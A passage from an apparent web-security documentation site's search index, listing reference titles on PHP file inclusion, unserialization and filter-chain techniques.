Johannes Dahse</li> <li>It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas</li> <li>CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018</li> <li>Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction</li> <li>PHP LFI with Nginx Assistance</li> <li>PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18</li> <li>LFI2RCE via PHP Filters - HackTricks</li> <li>Solving \"includer's revenge\" from hxp ctf 2021 without controlling any files - @loknop</li> <li>PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - R\u00e9mi Matasse - 18/10/2022</li> <li>PHP FILTER CHAINS: FILE READ FROM ERROR-BASED ORACLE - R\u00e9mi Matasse - 21/03/2023</li> <li>One Line PHP: From Genesis to Ragnar\u00f6k - Ginoah, Bookgin</li> <li>Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - 11 December, 2023</li> </ul>"},{"location":"web-application-attacks/file-upload/","title":"Index","text":""}]}